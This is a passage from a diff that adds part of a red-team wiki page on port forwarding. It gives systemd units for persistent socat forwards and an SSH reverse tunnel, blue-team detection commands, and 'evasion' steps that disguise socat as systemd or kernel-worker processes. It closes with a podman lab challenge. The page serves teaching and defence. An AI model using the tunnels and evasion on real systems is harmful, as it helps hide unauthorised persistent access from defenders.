+# autossh runs the SSH command, monitors its exit, and restarts
+
+# Verify autossh is running:
+ps aux | grep autossh
+						</pre>
+						<h4 id="systemd-unit-for-socat">systemd Unit for socat</h4>
+						<pre class="ini">
+# /etc/systemd/system/port-forward.service
+[Unit]
+Description=Persistent Port Forward: 4444 → 192.168.1.100:22
+After=network-online.target
+Wants=network-online.target
+
+[Service]
+Type=simple
+ExecStart=/usr/bin/socat TCP4-LISTEN:4444,fork,reuseaddr TCP4:192.168.1.100:22
+Restart=always
+RestartSec=10
+User=nobody
+Group=nobody
+
+[Install]
+WantedBy=multi-user.target
+						</pre>
+						<pre class="bash">
+sudo systemctl daemon-reload
+sudo systemctl enable --now port-forward.service
+sudo systemctl status port-forward.service
+
+# Verify:
+ss -tlnp | grep 4444
+# Should show socat listening, owned by nobody
+						</pre>
+						<h4 id="systemd-service-for-ssh-tunnel">systemd Service for SSH Tunnel</h4>
+						<pre class="ini">
+# /etc/systemd/system/ssh-tunnel.service
+[Unit]
+Description=SSH Reverse Tunnel to public server
+After=network-online.target
+Wants=network-online.target
+
+[Service]
+Type=simple
+ExecStart=/usr/bin/ssh -o &#34;ServerAliveInterval=30&#34; -o &#34;ServerAliveCountMax=2&#34; \
+    -o &#34;ExitOnForwardFailure=yes&#34; \
+    -NT -R 2222:localhost:22 tunnel-operator@public-server.example.com
+Restart=always
+RestartSec=30
+User=tunnel-operator
+
+[Install]
+WantedBy=multi-user.target
+						</pre>
+						<pre class="bash">
+# Create unprivileged user for tunneling:
+sudo useradd -m -s /bin/false tunnel-operator
+
+# Generate keypair for this user:
+sudo -u tunnel-operator ssh-keygen -t ed25519 -N &#39;&#39; -f /home/tunnel-operator/.ssh/id_ed25519
+
+# Add public key to public-server&#39;s authorized_keys:
+sudo -u tunnel-operator cat /home/tunnel-operator/.ssh/id_ed25519.pub
+# Append to public-server:~tunnel-operator/.ssh/authorized_keys
+
+# Test then enable:
+sudo systemctl start ssh-tunnel.service
+sudo systemctl status ssh-tunnel.service
+sudo systemctl enable ssh-tunnel.service
+						</pre>
+						<p>---</p>
+					</section>
+					<section>
+						<h3 id="port-forwarding-detection">Port Forwarding Detection</h3>
+						<p>Blue teams look for:</p>
+						<ol>
+							<li><b>Unexpected listening ports</b> - <code>ss -tlnp</code> shows socat/rinetd processes on non-standard ports.</li>
+						</ol>
+						<ol>
+							<li><b>Process genealogy</b> - <abbr title="Secure Shell">SSH</abbr> process with <code>-L</code> or <code>-R</code> flags: <code>ps aux | grep &#34;ssh.*-L\|ssh.*-R&#34;</code></li>
+						</ol>
+						<ol>
+							<li><b>Connection tracking</b> - <code>ss -tnp</code> showing connections that don't terminate at the local process but are forwarded elsewhere.</li>
+						</ol>
+						<ol>
+							<li><b>Netstat anomalies</b> - <code>netstat -tulpn</code> (deprecated, use ss) showing <code>0.0.0.0:PORT</code> listeners owned by unexpected users.</li>
+						</ol>
+						<pre class="bash">
+# Blue team one-liner to find all port forwarders:
+ss -tlnp | grep -vE &#39;sshd|nginx|apache|httpd|systemd|containerd|dockerd&#39;
+
+# Find SSH tunnels specifically:
+ps aux | grep &#39;ssh.*-.*[LRD].*[0-9]&#39; | grep -v grep
+
+# Monitor established connections from relay processes:
+ss -tnp state established | grep -E &#39;socat|rinetd|ncat|3proxy&#39;
+
+# Auditd rule for socat execution:
+auditctl -a always,exit -F arch=b64 -S execve -F exe=/usr/bin/socat \
+    -k port-forward-socat
+						</pre>
+						<p>Evasion countermeasures:</p>
+						<pre class="bash">
+# Rename the socat binary:
+cp /usr/bin/socat /usr/lib/systemd/systemd-network
+/usr/lib/systemd/systemd-network TCP4-LISTEN:4444,fork,reuseaddr TCP4:target:22 &amp;
+
+# Process name masking via exec -a:
+exec -a [kworker/u8:2] socat TCP4-LISTEN:4444,fork,reuseaddr TCP4:target:22 &amp;
+
+# Or compile socat from source with a different name:
+# git clone, modify Makefile CC lines to output &#39;systemd-logind&#39;
+						</pre>
+					</section>
+					<section>
+						<h3 id="challenge">Challenge</h3>
+						<p>
+							Access the internal web server and retrieve the flag from the attacker network using port forwarding
+							on the jumpbox.
+						</p>
+						<p><a href="/wiki/articles/redteam/port-forwarding.Containerfile">port-forwarding.Containerfile</a></p>
+						<p>The Containerfile builds a two-container lab:</p>
+						<ul>
+							<li><b>jumpbox</b> : dual-homed container connected to both <code>attacker-net</code> (10.89.0.0/24) and <code>internal-net</code> (10.89.1.0/24). Pre-installed with socat, rinetd, <abbr title="Secure Shell">SSH</abbr> server and client.</li>
+							<li><b>internal-server</b> : connected only to <code>internal-net</code> . Runs nginx on port 80 and <abbr title="Secure Shell">SSH</abbr> on port 22. Contains a flag at <code>/var/www/html/flag.txt</code> .</li>
+						</ul>
+						<pre class="bash">
+# Build:
+podman build -t portfwd-jumpbox -f port-forwarding.Containerfile --target jumpbox .
+podman build -t portfwd-internal -f port-forwarding.Containerfile --target internal .
+
+# Create networks:
+podman network create attacker-net --subnet 10.89.0.0/24
+podman network create internal-net --subnet 10.89.1.0/24 --internal
+
+# Launch:
+podman run -d --name jumpbox --network attacker-net --network internal-net \
+    --cap-add NET_ADMIN portfwd-jumpbox
+podman run -d --name internal-srv --network internal-net portfwd-internal
+
+# Get IPs:
+JUMPBOX_IP=$(podman inspect jumpbox --format &#39;{{.NetworkSettings.Networks.attacker-net.IPAddress}}&#39;)
+INTERNAL_IP=$(podman inspect internal-srv --format &#39;{{.NetworkSettings.Networks.internal-net.IPAddress}}&#39;)
+
+echo &#34;Jumpbox attacker-side IP: $JUMPBOX_IP&#34;
+echo &#34;Internal server IP: $INTERNAL_IP (only reachable from jumpbox)&#34;
+
+# Verify connectivity — direct to internal server should FAIL:
+curl -s --connect-timeout 3 http://$INTERNAL_IP &amp;&amp; echo &#34;ERROR: direct access!&#34; || echo &#34;OK: internal is isolated&#34;
+
+# Exercise 1: socat port forward on jumpbox
+# SSH into jumpbox: ssh root@$JUMPBOX_IP
+# On jumpbox: socat TCP4-LISTEN:8080,fork,reuseaddr TCP4:INTERNAL_IP:80 &amp;
+# From attacker: curl http://$JUMPBOX_IP:8080/flag.txt
+
+# Exercise 2: rinetd approach
+# Edit /etc/rinetd.conf, add: 0.0.0.0 9090 INTERNAL_IP 80
+# Start rinetd, test: curl http://$JUMPBOX_IP:9090/flag.txt
+
+# Exercise 3: iptables NAT
+# iptables -t nat -A PREROUTING -p tcp --dport 7070 -j DNAT --to $INTERNAL_IP:80
+# iptables -t nat -A POSTROUTING -j MASQUERADE
+# echo 1 &gt; /proc/sys/net/ipv4/ip_forward
+
+# Cleanup:
+podman stop jumpbox internal-srv &amp;&amp; podman rm jumpbox internal-srv
+podman network rm attacker-net internal-net
+						</pre>
+					</section>
+					<section>
+						<h3 id="references">References</h3>
+						<ul>
+							<li><a class="icon-website" href="https://man7.org/linux/man-pages/man1/socat.1.html" target="_blank">socat(1) - Linux manual page</a></li>
+							<li><a class="icon-github" href="https://github.com/samhocevar/rinetd" target="_blank">rinetd - TCP redirection server</a></li>
+							<li><a class="icon-website" href="https://nmap.org/book/ncat-man.html" target="_blank">ncat(1) - Nmap reference guide</a></li>
+							<li><a class="icon-website" href="https://man.openbsd.org/ssh.1" target="_blank">OpenSSH manual: ssh(1)</a> - <code>-L</code> , <code>-R</code> , and <code>-D</code> forwarding</li>
+							<li><a class="icon-website" href="https://man7.org/linux/man-pages/man8/iptables.8.html" target="_blank">iptables(8) - Linux manual page</a></li>
+							<li><a class="icon-website" href="https://datatracker.ietf.org/doc/html/rfc2663" target="_blank">RFC 2663 - IP Network Address Translator (NAT) Terminology and Considerations</a></li>
+							<li><a class="icon-website" href="https://www.harding.motd.ca/autossh/" target="_blank">autossh - automatically restart SSH sessions and tunnels</a></li>
+						</ul>
+					</section>
+				</article>
+			</main>
+		</div>
+
+		<footer>
+			<div></div>
+			<div class="print-not">Made with 💔 in Germany. &copy; Cookie Engineer (https://cookie.engineer). All rights (and jokes) reserved under European Law.</div>
+			<div></div>
+		</footer>
+
+	</body>
+</html>
